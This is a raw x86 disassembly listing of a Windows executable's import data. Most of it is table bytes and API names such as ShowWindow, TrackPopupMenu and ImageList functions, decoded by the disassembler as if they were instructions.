  4280ef:	add    BYTE PTR [eax],al
  4280f1:	jb     0x4280f3
  4280f3:	jne    0x4280f5
  4280f5:	je     0x4280f7
  4280f7:	ins    DWORD PTR es:[edi],dx
  4280f8:	add    BYTE PTR [ebp+0x0],dh
  4280fb:	arpl   WORD PTR [eax],ax
  4280fd:	jne    0x4280ff
  4280ff:	jo     0x428101
  428101:	add    BYTE PTR [eax],al
  428103:	jae    0x428105
  428105:	outs   dx,DWORD PTR ds:[esi]
  428106:	add    BYTE PTR [esi+0x0],ah
  428109:	imul   eax,DWORD PTR [eax],0x630062
  42810f:	outs   dx,DWORD PTR ds:[esi]
  428110:	add    BYTE PTR [ecx+0x0],ch
  428113:	jb     0x428115
  428115:	jae    0x428117
  428117:	outs   dx,DWORD PTR ds:[esi]
  428118:	add    BYTE PTR [eax],al
  42811a:	add    BYTE PTR [ebx+0x0],dl
  42811d:	outs   dx,DWORD PTR ds:[esi]
  42811e:	add    BYTE PTR [ebx+0x0],ah
  428121:	popa   
  428122:	add    BYTE PTR [ecx+0x0],ch
  428125:	jae    0x428127
  428127:	data16 add BYTE PTR [ecx+0x0],ah
  42812b:	jb     0x42812d
  42812d:	popa   
  42812e:	add    BYTE PTR [ecx+0x0],ch
  428131:	add    BYTE PTR [eax],al
  428133:	add    BYTE PTR [esi],cl
  428135:	adc    BYTE PTR [eax],al
  428137:	out    0x67,eax
  428139:	adc    BYTE PTR [eax],al
  42813b:	js     0x428164
  42813d:	adc    BYTE PTR [eax],al
  42813f:	test   al,0x13
  428141:	adc    BYTE PTR [eax],al
  428143:	fs push esi
  428145:	adc    BYTE PTR [eax],al
  428147:	jp     0x428169
  428149:	adc    BYTE PTR [eax],al
  42814b:	enter  0x1052,0x0
  42814f:	loop   0x4281c4
  428151:	adc    BYTE PTR [eax],al
  428153:	ja     0x4281c0
  428155:	adc    BYTE PTR [eax],al
  428157:	cmp    al,0x2b
  428159:	adc    BYTE PTR [eax],al
  42815b:	rcl    BYTE PTR [edx],1
  42815d:	adc    BYTE PTR [eax],al
  42815f:	sbb    DWORD PTR [eax+0x10],ebx
  428162:	add    BYTE PTR [esi],ah
  428164:	add    dl,BYTE PTR [eax]
  428166:	add    BYTE PTR [edi+0xc],dh
  428169:	adc    BYTE PTR [eax],al
  42816b:	mov    dh,BYTE PTR [ecx]
  42816d:	adc    BYTE PTR [eax],al
  42816f:	out    dx,al
  428170:	sbb    eax,0xed80010
  428175:	adc    BYTE PTR [eax],al
  428177:	add    eax,0x3300107f
  42817c:	jbe    0x42818e
  42817e:	add    BYTE PTR [ebx],dh
  428180:	add    DWORD PTR [edx+0x0],0x428137
  428187:	cmp    eax,DWORD PTR [ecx-0x7ec0ffbe]
  42818d:	inc    edx
  42818e:	add    BYTE PTR [ebx-0x7f],al
  428191:	inc    edx
  428192:	add    BYTE PTR [edi-0x7f],al
  428195:	inc    edx
  428196:	add    BYTE PTR [ebx-0x7f],cl
  428199:	inc    edx
  42819a:	add    BYTE PTR [edi-0x7f],cl
  42819d:	inc    edx
  42819e:	add    BYTE PTR [ebx-0x7f],dl
  4281a1:	inc    edx
  4281a2:	add    BYTE PTR [edi-0x7f],dl
  4281a5:	inc    edx
  4281a6:	add    BYTE PTR [ebx-0x7f],bl
  4281a9:	inc    edx
  4281aa:	add    BYTE PTR [edi-0x7f],bl
  4281ad:	inc    edx
  4281ae:	add    BYTE PTR [ebx-0x7f],ah
  4281b1:	inc    edx
  4281b2:	add    BYTE PTR [edi-0x7f],ah
  4281b5:	inc    edx
  4281b6:	add    BYTE PTR [ebx-0x7f],ch
  4281b9:	inc    edx
  4281ba:	add    BYTE PTR [edi-0x7f],ch
  4281bd:	inc    edx
  4281be:	add    BYTE PTR [ebx-0x7f],dh
  4281c1:	inc    edx
  4281c2:	add    BYTE PTR [edi-0x7f],dh
  4281c5:	inc    edx
  4281c6:	add    BYTE PTR [ebx-0x7f],bh
  4281c9:	inc    edx
  4281ca:	add    BYTE PTR [ebx],cl
  4281cc:	add    BYTE PTR [edx+0x0],0xf
  4281d0:	add    BYTE PTR [edx+0x0],0x13
  4281d4:	add    BYTE PTR [edx+0x0],0x17
  4281d8:	add    BYTE PTR [edx+0x0],0x1b
  4281dc:	add    BYTE PTR [edx+0x0],0x1f
  4281e0:	add    BYTE PTR [edx+0x0],0x23
  4281e4:	add    BYTE PTR [edx+0x0],0x27
  4281e8:	add    BYTE PTR [edx+0x0],0x2b
  4281ec:	add    BYTE PTR [edx+0x0],0x2f
  4281f0:	add    BYTE PTR [edx+0x0],0x33
  4281f4:	add    BYTE PTR [edx+0x0],0x37
  4281f8:	add    BYTE PTR [edx+0x0],0x3b
  4281fc:	add    BYTE PTR [edx+0x0],0x3f
  428200:	add    BYTE PTR [edx+0x0],0x43
  428204:	add    BYTE PTR [edx+0x0],0x47
  428208:	add    BYTE PTR [edx+0x0],0x29
  42820c:	or     al,0x10
  42820e:	add    BYTE PTR [edx-0x57ffefc2],dl
  428214:	push   edi
  428215:	adc    BYTE PTR [eax],al
  428217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428218:	outs   dx,DWORD PTR ds:[esi]
  428219:	adc    BYTE PTR [eax],al
  42821b:	push   ebx
  42821c:	popa   
  42821d:	adc    BYTE PTR [eax],al
  42821f:	add    dh,BYTE PTR [ebp+0x10]
  428222:	add    dh,cl
  428224:	jle    0x428236
  428226:	add    BYTE PTR [esi+edx*2],dl
  428229:	adc    BYTE PTR [eax],al
  42822b:	mov    al,0x68
  42822d:	adc    BYTE PTR [eax],al
  42822f:	aas    
  428230:	inc    esp
  428231:	adc    BYTE PTR [eax],al
  428233:	pop    ebp
  428234:	and    DWORD PTR [eax],edx
  428236:	add    bl,dl
  428238:	jl     0x42824a
  42823a:	add    BYTE PTR [edx+0xb],dh
  42823d:	adc    BYTE PTR [eax],al
  42823f:	inc    edx
  428240:	push   eax
  428241:	adc    BYTE PTR [eax],al
  428243:	mov    ebp,0xbb001074
  428248:	pop    ds
  428249:	adc    BYTE PTR [eax],al
  42824b:	sub    DWORD PTR [eax+0x10],eax
  42824e:	add    BYTE PTR [ecx],dh
  428250:	ja     0x428262
  428252:	add    bl,dl
  428254:	sbb    dl,BYTE PTR [eax]
  428256:	add    BYTE PTR [esi+0x1e],ch
  428259:	adc    BYTE PTR [eax],al
  42825b:	or     ch,BYTE PTR [esi]
  42825d:	adc    BYTE PTR [eax],al
  42825f:	sbb    eax,0xa100103e
  428264:	data16 adc BYTE PTR [eax],al
  428267:	xchg   ecx,eax
  428268:	bound  edx,QWORD PTR [eax]
  42826a:	add    BYTE PTR [esi],bh
  42826c:	dec    edi
  42826d:	adc    BYTE PTR [eax],al
  42826f:	in     eax,dx
  428270:	adc    BYTE PTR fs:[eax],al
  428273:	sub    bl,BYTE PTR [ecx+0x10]
  428276:	add    BYTE PTR [esi+0x43],al
  428279:	adc    BYTE PTR [eax],al
  42827b:	imul   edi,DWORD PTR [eax+edx*1],0x0
  42827f:	rol    BYTE PTR [esi+0x10],0x0
  428283:	in     eax,0x31
  428285:	adc    BYTE PTR [eax],al
  428287:	mov    esp,0x4b00104f
  42828c:	add    BYTE PTR [edx+0x0],0x4f
  428290:	add    BYTE PTR [edx+0x0],0x53
  428294:	add    BYTE PTR [edx+0x0],0x57
  428298:	add    BYTE PTR [edx+0x0],0x5b
  42829c:	add    BYTE PTR [edx+0x0],0x5f
  4282a0:	add    BYTE PTR [edx+0x0],0x63
  4282a4:	add    BYTE PTR [edx+0x0],0x67
  4282a8:	add    BYTE PTR [edx+0x0],0x6b
  4282ac:	add    BYTE PTR [edx+0x0],0x6f
  4282b0:	add    BYTE PTR [edx+0x0],0x73
  4282b4:	add    BYTE PTR [edx+0x0],0x77
  4282b8:	add    BYTE PTR [edx+0x0],0x7b
  4282bc:	add    BYTE PTR [edx+0x0],0x7f
  4282c0:	add    BYTE PTR [edx+0x0],0x83
  4282c4:	add    BYTE PTR [edx+0x0],0x87
  4282c8:	add    BYTE PTR [edx+0x0],0xe1
  4282cc:	and    dl,BYTE PTR [eax]
  4282ce:	add    bh,bh
  4282d0:	push   ecx
  4282d1:	adc    BYTE PTR [eax],al
  4282d3:	test   BYTE PTR ds:0x1d0c0010,0x10
  4282da:	add    BYTE PTR [ebx],al
  4282dc:	sbb    dl,BYTE PTR [eax]
  4282de:	add    ch,ah
  4282e0:	or     dl,BYTE PTR [eax]
  4282e2:	add    BYTE PTR [edi+0x42001035],bl
  4282e8:	pop    edi
  4282e9:	adc    BYTE PTR [eax],al
  4282eb:	adc    eax,0xd300103f
  4282f0:	cmp    dl,BYTE PTR [eax]
  4282f2:	add    BYTE PTR [ebp+0x1001021],ah
  4282f8:	sbb    al,0x10
  4282fa:	add    BYTE PTR [ebx-0x1effefd7],ch
  428300:	adc    BYTE PTR cs:[eax],al
  428303:	push   eax
  428304:	adc    BYTE PTR [bx+si],al
  428307:	mov    edi,0xcb00102d
  42830c:	add    BYTE PTR [edx+0x0],0xcf
  428310:	add    BYTE PTR [edx+0x0],0xd3
  428314:	add    BYTE PTR [edx+0x0],0xd7
  428318:	add    BYTE PTR [edx+0x0],0xdb
  42831c:	add    BYTE PTR [edx+0x0],0xdf
  428320:	add    BYTE PTR [edx+0x0],0xe3
  428324:	add    BYTE PTR [edx+0x0],0xe7
  428328:	add    BYTE PTR [edx+0x0],0xeb
  42832c:	add    BYTE PTR [edx+0x0],0xef
  428330:	add    BYTE PTR [edx+0x0],0xf3
  428334:	add    BYTE PTR [edx+0x0],0xf7
  428338:	add    BYTE PTR [edx+0x0],0xfb
  42833c:	add    BYTE PTR [edx+0x0],0xff
  428340:	add    BYTE PTR [edx+0x0],0x3
  428344:	add    DWORD PTR [edx+0x0],0x7
  428348:	add    DWORD PTR [edx+0x0],0xffffff98
  42834c:	pusha  
  42834d:	adc    BYTE PTR [eax],al
  42834f:	pop    ebp
  428350:	js     0x428362
  428352:	add    BYTE PTR [esi],bh
  428354:	dec    eax
  428355:	adc    BYTE PTR [eax],al
  428357:	cmp    al,0x7a
  428359:	adc    BYTE PTR [eax],al
  42835b:	aam    0x9
  42835d:	adc    BYTE PTR [eax],al
  42835f:	or     cl,BYTE PTR [ebx]
  428361:	adc    BYTE PTR [eax],al
  428363:	pop    ebx
  428364:	push   ebp
  428365:	adc    BYTE PTR [eax],al
  428367:	mov    esi,0x6001032
  42836c:	xor    edx,DWORD PTR [eax]
  42836e:	add    BYTE PTR [esi-0x16ffefc0],al
  428374:	and    eax,0x61460010
  428379:	adc    BYTE PTR [eax],al
  42837b:	adc    DWORD PTR [ebp+0x10],ebp
  42837e:	add    al,al
  428380:	dec    esi
  428381:	adc    BYTE PTR [eax],al
  428383:	jae    0x4283a3
  428385:	adc    BYTE PTR [eax],al
  428387:	dec    ebx
  428388:	add    eax,0x834b0010
  42838d:	inc    edx
  42838e:	add    BYTE PTR [edi-0x7d],cl
  428391:	inc    edx
  428392:	add    BYTE PTR [ebx-0x7d],dl
  428395:	inc    edx
  428396:	add    BYTE PTR [edi-0x7d],dl
  428399:	inc    edx
  42839a:	add    BYTE PTR [ebx-0x7d],bl
  42839d:	inc    edx
  42839e:	add    BYTE PTR [edi-0x7d],bl
  4283a1:	inc    edx
  4283a2:	add    BYTE PTR [ebx-0x7d],ah
  4283a5:	inc    edx
  4283a6:	add    BYTE PTR [edi-0x7d],ah
  4283a9:	inc    edx
  4283aa:	add    BYTE PTR [ebx-0x7d],ch
  4283ad:	inc    edx
  4283ae:	add    BYTE PTR [edi-0x7d],ch
  4283b1:	inc    edx
  4283b2:	add    BYTE PTR [ebx-0x7d],dh
  4283b5:	inc    edx
  4283b6:	add    BYTE PTR [edi-0x7d],dh
  4283b9:	inc    edx
  4283ba:	add    BYTE PTR [ebx-0x7d],bh
  4283bd:	inc    edx
  4283be:	add    BYTE PTR [edi-0x7d],bh
  4283c1:	inc    edx
  4283c2:	add    BYTE PTR [ebx-0x78ffbd7d],al
  4283c8:	add    DWORD PTR [edx+0x0],0x0
	...
  4283d4:	cmp    dh,BYTE PTR [ecx+0x52]
  4283d7:	dec    edi
  4283d8:	add    BYTE PTR [eax],al
  4283da:	add    BYTE PTR [eax],al
  4283dc:	xor    BYTE PTR [ebp+0x10002],cl
  4283e2:	add    BYTE PTR [eax],al
  4283e4:	add    DWORD PTR [eax],eax
  4283e6:	add    BYTE PTR [eax],al
  4283e8:	add    DWORD PTR [eax],eax
  4283ea:	add    BYTE PTR [eax],al
  4283ec:	add    BYTE PTR [ebp-0x72dffffe],cl
  4283f2:	add    al,BYTE PTR [eax]
  4283f4:	adc    BYTE PTR [ebp+0x2],cl
	...
  428402:	add    BYTE PTR [eax],al
  428404:	enter  0x285,0x0
  428408:	in     al,0x85
  42840a:	add    al,BYTE PTR [eax]
  42840c:	test   BYTE PTR [ebp-0x79f7fffe],0x2
  428413:	add    BYTE PTR [eax],ah
  428415:	xchg   BYTE PTR [edx],al
  428417:	add    BYTE PTR [esi+eax*4],dh
  42841a:	add    al,BYTE PTR [eax]
  42841c:	dec    esi
  42841d:	xchg   BYTE PTR [edx],al
  42841f:	add    BYTE PTR [eax],al
  428421:	add    BYTE PTR [eax],al
  428423:	add    BYTE PTR [eax-0x7a],dh
  428426:	add    al,BYTE PTR [eax]
  428428:	mov    es,WORD PTR [esi-0x7963fffe]
  42842e:	add    al,BYTE PTR [eax]
  428430:	stos   BYTE PTR es:[edi],al
  428431:	xchg   BYTE PTR [edx],al
  428433:	add    BYTE PTR [esi-0x33fffd7a],bh
  428439:	xchg   BYTE PTR [edx],al
  42843b:	add    dh,bl
  42843d:	xchg   BYTE PTR [edx],al
  42843f:	add    al,dh
  428441:	xchg   BYTE PTR [edx],al
  428443:	add    dh,bh
  428445:	xchg   BYTE PTR [edx],al
  428447:	add    BYTE PTR [eax],dl
  428449:	xchg   DWORD PTR [edx],eax
  42844b:	add    BYTE PTR [edx],ah
  42844d:	xchg   DWORD PTR [edx],eax
  42844f:	add    BYTE PTR [eax],dh
  428451:	xchg   DWORD PTR [edx],eax
  428453:	add    BYTE PTR [esi],bh
  428455:	xchg   DWORD PTR [edx],eax
  428457:	add    BYTE PTR [eax-0x79],dl
  42845a:	add    al,BYTE PTR [eax]
  42845c:	pop    esp
  42845d:	xchg   DWORD PTR [edx],eax
  42845f:	add    BYTE PTR [edx-0x79],dh
  428462:	add    al,BYTE PTR [eax]
  428464:	test   BYTE PTR [edi-0x7869fffe],al
  42846a:	add    al,BYTE PTR [eax]
  42846c:	mov    ds:0xb2000287,al
  428471:	xchg   DWORD PTR [edx],eax
  428473:	add    dl,al
  428475:	xchg   DWORD PTR [edx],eax
  428477:	add    al,bl
  428479:	xchg   DWORD PTR [edx],eax
  42847b:	add    ah,ah
  42847d:	xchg   DWORD PTR [edx],eax
  42847f:	add    dh,dh
  428481:	xchg   DWORD PTR [edx],eax
  428483:	add    BYTE PTR [eax+ecx*4],cl
  428486:	add    al,BYTE PTR [eax]
  428488:	push   ds
  428489:	mov    BYTE PTR [edx],al
  42848b:	add    BYTE PTR [eax+ecx*4],ch
  42848e:	add    al,BYTE PTR [eax]
  428490:	cmp    al,0x88
  428492:	add    al,BYTE PTR [eax]
  428494:	dec    esi
  428495:	mov    BYTE PTR [edx],al
  428497:	add    BYTE PTR [edx-0x78],ah
  42849a:	add    al,BYTE PTR [eax]
  42849c:	js     0x428426
  42849e:	add    al,BYTE PTR [eax]
  4284a0:	mov    cl,BYTE PTR [eax-0x7763fffe]
  4284a6:	add    al,BYTE PTR [eax]
  4284a8:	lods   al,BYTE PTR ds:[esi]
  4284a9:	mov    BYTE PTR [edx],al
  4284ab:	add    BYTE PTR [eax+ecx*4-0x7733fffe],bh
  4284b2:	add    al,BYTE PTR [eax]
  4284b4:	fimul  WORD PTR [eax-0x7713fffe]
  4284ba:	add    al,BYTE PTR [eax]
  4284bc:	cli    
  4284bd:	mov    BYTE PTR [edx],al
  4284bf:	add    BYTE PTR [edx],dl
  4284c1:	mov    DWORD PTR [edx],eax
  4284c3:	add    BYTE PTR [ecx+ecx*4],ah
  4284c6:	add    al,BYTE PTR [eax]
  4284c8:	mov    DWORD PTR ss:[edx],eax
  4284cb:	add    BYTE PTR [edx-0x77],al
  4284ce:	add    al,BYTE PTR [eax]
  4284d0:	dec    esi
  4284d1:	mov    DWORD PTR [edx],eax
  4284d3:	add    BYTE PTR [edx-0x77],bl
  4284d6:	add    al,BYTE PTR [eax]
  4284d8:	push   0xffffff89
  4284da:	add    al,BYTE PTR [eax]
  4284dc:	or     BYTE PTR [ecx-0x7671fffe],0x2
  4284e3:	add    BYTE PTR [eax-0x4dfffd77],ah
  4284e9:	mov    DWORD PTR [edx],eax
  4284eb:	add    BYTE PTR [eax],al
  4284ed:	add    BYTE PTR [eax],al
  4284ef:	add    ah,cl
  4284f1:	mov    DWORD PTR [edx],eax
  4284f3:	add    BYTE PTR [eax],al
  4284f5:	add    BYTE PTR [eax],al
  4284f7:	add    dl,ch
  4284f9:	mov    DWORD PTR [edx],eax
  4284fb:	add    ah,bh
  4284fd:	mov    DWORD PTR [edx],eax
  4284ff:	add    BYTE PTR [esi],cl
  428501:	mov    al,BYTE PTR [edx]
  428503:	add    BYTE PTR [edx+ecx*4],ah
  428506:	add    al,BYTE PTR [eax]
  428508:	mov    al,BYTE PTR ss:[edx]
  42850b:	add    BYTE PTR [eax-0x76],cl
  42850e:	add    al,BYTE PTR [eax]
  428510:	pop    eax
  428511:	mov    al,BYTE PTR [edx]
  428513:	add    BYTE PTR [esi-0x76],dh
  428516:	add    al,BYTE PTR [eax]
  428518:	xchg   BYTE PTR [edx-0x756bfffe],cl
  42851e:	add    al,BYTE PTR [eax]
  428520:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428521:	mov    al,BYTE PTR [edx]
  428523:	add    BYTE PTR [edx-0x3dfffd76],dh
  428529:	mov    al,BYTE PTR [edx]
  42852b:	add    dh,cl
  42852d:	mov    al,BYTE PTR [edx]
  42852f:	add    al,ah
  428531:	mov    al,BYTE PTR [edx]
  428533:	add    dl,dh
  428535:	mov    al,BYTE PTR [edx]
  428537:	add    BYTE PTR [eax],cl
  428539:	mov    eax,DWORD PTR [edx]
  42853b:	add    BYTE PTR [esi],dl
  42853d:	mov    eax,DWORD PTR [edx]
  42853f:	add    BYTE PTR [edx],ah
  428541:	mov    eax,DWORD PTR [edx]
  428543:	add    BYTE PTR [ebx+ecx*4],bh
  428546:	add    al,BYTE PTR [eax]
  428548:	push   esp
  428549:	mov    eax,DWORD PTR [edx]
  42854b:	add    BYTE PTR [ebx+ecx*4+0x2],ch
  42854f:	add    BYTE PTR [edx-0x75],bh
  428552:	add    al,BYTE PTR [eax]
  428554:	xchg   BYTE PTR [ebx-0x7467fffe],cl
  42855a:	add    al,BYTE PTR [eax]
  42855c:	add    BYTE PTR [eax],al
  42855e:	add    BYTE PTR [eax],al
  428560:	mov    eax,0xc200028b
  428565:	mov    eax,DWORD PTR [edx]
  428567:	add    al,dl
  428569:	mov    eax,DWORD PTR [edx]
  42856b:	add    ah,bl
  42856d:	mov    eax,DWORD PTR [edx]
  42856f:	add    ah,ch
  428571:	mov    eax,DWORD PTR [edx]
  428573:	add    dl,bh
  428575:	mov    eax,DWORD PTR [edx]
  428577:	add    BYTE PTR [esi],al
  428579:	mov    WORD PTR [edx],es
  42857b:	add    BYTE PTR [eax],dl
  42857d:	mov    WORD PTR [edx],es
  42857f:	add    BYTE PTR [edx],ah
  428581:	mov    WORD PTR [edx],es
  428583:	add    BYTE PTR [eax],bh
  428585:	mov    WORD PTR [edx],es
  428587:	add    BYTE PTR [esi-0x74],cl
  42858a:	add    al,BYTE PTR [eax]
  42858c:	mov    WORD PTR fs:[edx],es
  42858f:	add    BYTE PTR [esp+ecx*4+0x2],dh
  428593:	add    BYTE PTR [esp+ecx*4-0x736bfffe],al
  42859a:	add    al,BYTE PTR [eax]
  42859c:	mov    ds:0xba00028c,al
  4285a1:	mov    WORD PTR [edx],es
  4285a3:	add    ah,al
  4285a5:	mov    WORD PTR [edx],es
  4285a7:	add    al,dl
  4285a9:	mov    WORD PTR [edx],es
  4285ab:	add    dh,bl
  4285ad:	mov    WORD PTR [edx],es
	...
  4285bf:	add    BYTE PTR [ebx+0x6d],ah
  4285c2:	fs cs gs js 0x42862c
  4285c7:	add    BYTE PTR [edi],dl
  4285c9:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4285cd:	je     0x428641
  4285cf:	outs   dx,DWORD PTR ds:[esi]
  4285d0:	jns    0x428622
  4285d2:	jb     0x428643
  4285d4:	jo     0x42863b
  4285d6:	jb     0x42864c
  4285d8:	jns    0x42862d
  4285da:	push   0x50746565
  4285df:	popa   
  4285e0:	add    BYTE PTR gs:[bx+si],al
  4285e4:	pop    esp
  4285e5:	add    BYTE PTR [eax+0x72],dl
  4285e8:	outs   dx,DWORD PTR ds:[esi]
  4285e9:	jo     0x428650
  4285eb:	jb     0x428661
  4285ed:	jns    0x428642
  4285ef:	push   0x57746565
  4285f4:	add    BYTE PTR [eax],al
  4285f6:	pop    ebx
  4285f7:	add    BYTE PTR [eax+0x72],dl
  4285fa:	outs   dx,DWORD PTR ds:[esi]
  4285fb:	jo     0x428662
  4285fd:	jb     0x428673
  4285ff:	jns    0x428654
  428601:	push   0x41746565
  428606:	add    BYTE PTR [eax],al
  428608:	dec    esi
  428609:	add    BYTE PTR [ecx+0x6d],cl
  42860c:	popa   
  42860d:	addr16 gs dec esp
  428610:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428617:	ins    BYTE PTR es:[edi],dx
  428618:	popa   
  428619:	arpl   WORD PTR [ebp+0x49],sp
  42861c:	arpl   WORD PTR [edi+0x6e],bp
  42861f:	add    BYTE PTR [ecx],dh
  428621:	add    BYTE PTR [ecx+0x6d],cl
  428624:	popa   
  428625:	addr16 gs dec esp
  428628:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42862f:	je     0x4286a3
  428631:	outs   dx,DWORD PTR ds:[esi]
  428632:	jns    0x428634
  428634:	inc    eax
  428635:	add    BYTE PTR [ecx+0x6d],cl
  428638:	popa   
  428639:	addr16 gs dec esp
  42863c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  428643:	dec    ecx
  428644:	ins    DWORD PTR es:[edi],dx
  428645:	popa   
  428646:	addr16 gs inc ebx
  428649:	outs   dx,DWORD PTR ds:[esi]
  42864a:	jne    0x4286ba
  42864c:	je     0x42864e
  42864e:	dec    esp
  42864f:	add    BYTE PTR [ecx+0x6d],cl
  428652:	popa   
  428653:	addr16 gs dec esp
  428656:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42865d:	outs   dx,DWORD PTR ds:[esi]
  42865e:	jbe    0x4286c5
  428660:	add    BYTE PTR [eax],al
  428662:	inc    ebx
  428663:	dec    edi
  428664:	dec    ebp
  428665:	inc    ebx
  428666:	push   esp
  428667:	dec    esp
  428668:	xor    esi,DWORD PTR [edx]
  42866a:	cs fs ins BYTE PTR es:[edi],dx
  42866d:	ins    BYTE PTR es:[edi],dx
  42866e:	add    BYTE PTR [eax],al
  428670:	push   edi
  428671:	add    BYTE PTR [ebx+0x72],al
  428674:	gs popa 
  428676:	je     0x4286dd
  428678:	inc    esp
  428679:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  428680:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  428688:	jb     0x4286eb
  42868a:	ins    DWORD PTR es:[edi],dx
  42868b:	push   edi
  42868c:	add    BYTE PTR [eax],al
  42868e:	xor    al,BYTE PTR [edx]
  428690:	push   ebx
  428691:	gs je  0x4286d7
  428694:	popa   
  428695:	jb     0x4286fc
  428697:	je     0x4286e9
  428699:	outs   dx,DWORD PTR ds:[esi]
  42869a:	jae    0x42869c
  42869c:	cmp    al,BYTE PTR [ecx]
  42869e:	inc    edi
  42869f:	gs je  0x4286ef
  4286a2:	gs jae 0x428718
  4286a5:	popa   
  4286a6:	addr16 gs inc ecx
  4286a9:	add    BYTE PTR [edx+0x61724400],dh
  4286af:	ja     0x4286f7
  4286b1:	jb     0x428714
  4286b3:	ins    DWORD PTR es:[edi],dx
  4286b4:	gs inc ebx
  4286b6:	outs   dx,DWORD PTR ds:[esi]
  4286b7:	outs   dx,BYTE PTR ds:[esi]
  4286b8:	je     0x42872c
  4286ba:	outs   dx,DWORD PTR ds:[esi]
  4286bb:	ins    BYTE PTR es:[edi],dx
  4286bc:	add    BYTE PTR [eax],al
  4286be:	sbb    BYTE PTR [ecx],al
  4286c0:	inc    edi
  4286c1:	gs je  0x42870d
  4286c4:	arpl   WORD PTR [edi+0x6e],bp
  4286c7:	dec    ecx
  4286c8:	outs   dx,BYTE PTR ds:[esi]
  4286c9:	outs   dx,WORD PTR ds:[esi]
  4286cb:	add    bl,bh
  4286cd:	add    dl,BYTE PTR [edx+esi*2+0x61]
  4286d1:	arpl   WORD PTR [ebx+0x50],bp
  4286d4:	outs   dx,DWORD PTR ds:[esi]
  4286d5:	jo     0x42874c
  4286d7:	jo     0x428726
  4286d9:	outs   dx,BYTE PTR gs:[esi]
  4286db:	jne    0x4286dd
  4286dd:	add    cl,bl
  4286df:	add    DWORD PTR [ebp+0x6f],ecx
  4286e2:	outs   dx,BYTE PTR ds:[esi]
  4286e3:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  4286eb:	push   edx
  4286ec:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  4286f1:	add    BYTE PTR [ebx+0x68],al
  4286f4:	popa   
  4286f5:	jb     0x42874c
  4286f7:	jo     0x428769
  4286f9:	gs jb  0x428753
  4286fc:	add    BYTE PTR [eax],al
  4286fe:	add    dl,BYTE PTR ds:[ebx+0x65]
  428702:	je     0x428748
  428704:	ins    BYTE PTR es:[edi],dx
  428705:	addr16 dec ecx
  428707:	je     0x42876e
  428709:	ins    DWORD PTR es:[edi],dx
  42870a:	push   esp
  42870b:	gs js  0x428782
  42870e:	inc    ecx
  42870f:	add    BYTE PTR [edx+eax*1+0x53],bh
  428713:	push   0x774f776f
  428718:	outs   dx,BYTE PTR ds:[esi]
  428719:	gs fs push eax
  42871c:	outs   dx,DWORD PTR ds:[esi]
  42871d:	jo     0x428794
  42871f:	jo     0x428794
  428721:	add    BYTE PTR [eax],bl
  428723:	add    dl,BYTE PTR [edx+0x65]
  428726:	ins    DWORD PTR es:[edi],dx
  428727:	outs   dx,DWORD PTR ds:[esi]
  428728:	jbe    0x42878f
  42872a:	push   eax
  42872b:	jb     0x42879c
  42872d:	jo     0x428786
  42872f:	add    BYTE PTR [edi+0x2],bh
  428732:	push   ebx
  428733:	push   0x6957776f
  428738:	outs   dx,BYTE PTR ds:[esi]
  428739:	outs   dx,DWORD PTR fs:[esi]
  42873b:	ja     0x42873d
  42873d:	add    BYTE PTR [ebx],bl
  42873f:	add    BYTE PTR [ebx+0x61],al
  428742:	ins    BYTE PTR es:[edi],dx
  428743:	ins    BYTE PTR es:[edi],dx
  428744:	push   edi
  428745:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  42874c:	outs   dx,DWORD PTR ds:[esi]
  42874d:	arpl   WORD PTR [edi+0x0],dx
  428750:	mov    dh,0x1
  428752:	dec    esp
  428753:	outs   dx,DWORD PTR ds:[esi]
  428754:	popa   
  428755:	fs dec ebp
  428757:	outs   dx,BYTE PTR gs:[esi]
  428759:	jne    0x42879c
  42875b:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428762:	arpl   WORD PTR [eax+0x54],bp
  428765:	outs   dx,DWORD PTR ds:[esi]
  428766:	push   esp
  428767:	push   0x69577369
  42876c:	outs   dx,BYTE PTR ds:[esi]
  42876d:	outs   dx,DWORD PTR fs:[esi]
  42876f:	ja     0x428771
  428771:	add    BYTE PTR [eax],ah
  428773:	add    dl,BYTE PTR [ebx+0x63]
  428776:	jb     0x4287e7
  428778:	ins    BYTE PTR es:[edi],dx
  428779:	ins    BYTE PTR es:[edi],dx
  42877a:	push   edi
  42877b:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428782:	add    BYTE PTR [eax],al
  428784:	pop    DWORD PTR [eax]
  428786:	inc    esp
  428787:	gs push di
  42878a:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428791:	outs   dx,DWORD PTR ds:[esi]
  428792:	arpl   WORD PTR [edi+0x0],dx
  428795:	add    BYTE PTR [ecx],dh
  428797:	add    BYTE PTR [ebx+0x68],al
  42879a:	popa   
  42879b:	jb     0x4287ed
  42879d:	jb     0x428804
  42879f:	jbe    0x4287f8
  4287a1:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  4287a8:	fs popa 
  4287aa:	je     0x428811
  4287ac:	push   edx
  4287ad:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4287b2:	xor    eax,DWORD PTR [ecx]
  4287b4:	inc    edi
  4287b5:	gs je  0x428805
  4287b8:	outs   dx,BYTE PTR gs:[esi]
  4287ba:	jne    0x428805
  4287bc:	je     0x428823
  4287be:	ins    DWORD PTR es:[edi],dx
  4287bf:	dec    ecx
  4287c0:	inc    esp
  4287c1:	add    BYTE PTR ds:0x6e655302,ch
  4287c7:	fs dec esi
  4287c9:	outs   dx,DWORD PTR ds:[esi]
  4287ca:	je     0x428835
  4287cc:	data16 jns 0x42881c
  4287cf:	gs jae 0x428845
  4287d2:	popa   
  4287d3:	addr16 gs push edi
  4287d6:	add    BYTE PTR [eax],al
  4287d8:	mov    al,0x1
  4287da:	dec    esp
  4287db:	outs   dx,DWORD PTR ds:[esi]
  4287dc:	popa   
  4287dd:	fs dec ecx
  4287df:	arpl   WORD PTR [edi+0x6e],bp
  4287e2:	push   edi
